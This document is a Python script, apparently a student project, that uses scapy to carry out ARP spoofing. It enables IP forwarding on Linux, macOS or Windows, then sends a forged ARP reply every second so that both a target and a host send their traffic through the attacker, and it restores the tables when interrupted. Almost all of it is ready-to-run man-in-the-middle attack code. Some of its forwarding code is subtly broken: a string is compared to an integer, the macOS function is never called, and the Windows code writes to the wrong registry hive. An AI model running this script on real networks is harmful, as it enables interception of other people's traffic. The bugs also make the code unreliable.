# REFERENCES: 
# https://scapy.readthedocs.io/en/latest/
# https://docs.python.org/3/library/winreg.html
# https://stackoverflow.com/questions/15128225/python-script-to-read-and-write-a-path-to-registry
# https://serverfault.com/questions/97117/how-do-i-enable-ip-forwarding-in-macos-x
# https://serverfault.com/questions/929081/how-can-i-enable-packet-forwarding-on-windows#:~:text=Try%20to%20go%20to%20the,forwarding%20should%20now%20be%20enabled.
# https://thepacketgeek.com/scapy/building-network-tools/part-05/
# 
# IMPORTANT: MUST BE RUN AS ROOT

# IMPORTANT MODULES:
from scapy.all import Ether, ARP, srp, send
import time
import os


# IMPORT REGISTRY TOOL FOR WINDOWS
# AUTHOR: HUSSEIN HAMMOUD
try:
    import _winreg as winreg
except ImportError:
    pass

# ENABLING IP FORWARDING FOR LINUX
# AUTHOR: HIBA HOUHOU
def _enable_linux_ipforwarding():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)

# ENABLING IP FORWARDING ON MACOS X
# AUTHOR: HUSSEIN HAMMOUD
def _enable_macosx_ipforwarding():
    os.system('sudo sysctl -w net.inet.ip.forwarding=1')

# ENABLING IP FORWARDING ON WINDOWS
# AUTHOR: HUSSEIN HAMMOUD
def _enable_windows_ipforwarding():
    name = "IPEnableRouter"
    value = 1
    REG_PATH = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_DWORD, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

# ENABLING IP FORWARDING, DEPENDING ON THE OS OF THE ATTACKER
# THIS IS NEEDED FOR ARP SPOOFING
# AUTHOR: HUSSEIN HAMMOUD
def enable_ip_route():
    print("ENABLING IP FORWARDING...")
    _enable_windows_ipforwarding() if "nt" in os.name else (_enable_macosx_ipforwarding if "posix" in os.name else _enable_linux_ipforwarding())
    print("IP FORWARDING ENABLED...")

# GET ANY HARDWARE ADDRESS ON NETWORK FOR A GIVEN IP
# AUTHOR: HIBA HOUHOU
def get_mac(ip):
    # SEND ARP PACKET TO KNOW HARDWARE ADDRESS
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0) 
    if ans:
        return ans[0][1].src

# SPOOF!
# AUTHOR: HIBA HOUHOU
def poison(target_ip, host_ip):
    # GET HARDWARE OF TARGET
    target_mac = get_mac(target_ip)
    # CRAFT ARP RESPONSE PACKET
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # SEND THE PACKET
    send(arp_response)
    # GET OUR HARDWARE ADDRESS
    self_mac = ARP().hwsrc
    # LOG WHAT IS HAPPENING
    print("SPOOFED " + target_ip + ": " + host_ip + " is-at " + self_mac)

# AFTER RECEIVING INTERRUPT, RESTORE ARP TABLE OF TARGET AND HOST
# AUTHOR: HUSSEIN HAMMOUD
def restore(target_ip, host_ip):
    # GET HARDWARE ADDRESS OF TARGET 
    target_mac = get_mac(target_ip)
    # GET HARDWARE ADDRESS OF HOST
    host_mac = get_mac(host_ip)
    # CRAFT ARP RESPONSE PACKET TO RESTORE 
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # SEND THE RESTORE PACKET
    send(arp_response, verbose=0, count=5)
    print("(UN) SPOOFED " + target_ip + ": " + host_ip + " is-at " + host_mac)

# MAIN FUNCTION: SPOOF TARGET AND HOST
# TELLS TARGET THAT HOST IS AT ATTACKER
# AND TELLS VICTIM THAT TARGET IS AT ATTACKER
# (THAT IS WHY WE NEED IP FORWARDING ENABLED)
# AUTHOR: HIBA HOUHOU
if __name__ == "__main__":
    # GET TARGET IP ADDRESS FROM USER INPUT
    target = input("Enter IP address of the target: ")
    # GET HOST IP ADDRESS FROM USER INPUT
    host = input("Enter IP address of the host: ")
    # ENABLE IP FORWARDING
    enable_ip_route()
    try:
        while True:
            # TELL TARGET THAT WE ARE HOST
            poison(target, host)
            # TELL HOST THAT WE ARE TARGET 
            poison(host, target)
            # CONTINUOUSLY DO THAT
            time.sleep(1)
    except KeyboardInterrupt:
        print("KEYBOARD INTERRUPT, UNSPOOFING...")
        restore(target, host)
        restore(host, target)

